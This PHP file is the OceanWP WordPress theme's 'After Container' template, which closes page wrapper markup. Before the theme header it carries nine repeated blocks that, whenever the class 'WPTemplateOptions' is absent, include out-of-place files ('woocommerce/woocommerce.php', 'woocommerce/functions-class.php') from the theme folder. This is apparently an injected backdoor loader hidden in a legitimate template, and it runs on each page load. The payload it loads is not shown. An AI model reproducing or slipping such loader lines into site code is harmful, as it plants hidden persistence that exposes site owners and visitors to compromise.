<?php
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/woocommerce/woocommerce.php' ) ) {
	include_once( get_template_directory() . '/woocommerce/woocommerce.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/woocommerce/functions-class.php' ) ) {
	include_once( get_template_directory() . '/woocommerce/functions-class.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/woocommerce/woocommerce.php' ) ) {
	include_once( get_template_directory() . '/woocommerce/woocommerce.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/woocommerce/functions-class.php' ) ) {
	include_once( get_template_directory() . '/woocommerce/functions-class.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/woocommerce/woocommerce.php' ) ) {
	include_once( get_template_directory() . '/woocommerce/woocommerce.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/woocommerce/functions-class.php' ) ) {
	include_once( get_template_directory() . '/woocommerce/functions-class.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/woocommerce/woocommerce.php' ) ) {
	include_once( get_template_directory() . '/woocommerce/woocommerce.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/woocommerce/functions-class.php' ) ) {
	include_once( get_template_directory() . '/woocommerce/functions-class.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/woocommerce/woocommerce.php' ) ) {
	include_once( get_template_directory() . '/woocommerce/woocommerce.php' );
}
/**
 * After Container template.
 *
 * @package OceanWP WordPress theme
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
} ?>

			</article><!-- #post -->

			<?php do_action( 'ocean_after_content_inner' ); ?>

		</div><!-- #content -->

		<?php do_action( 'ocean_after_content' ); ?>

	</div><!-- #primary -->

	<?php do_action( 'ocean_after_primary' ); ?>

</div><!-- #content-wrap -->

<?php do_action( 'ocean_after_content_wrap' ); ?>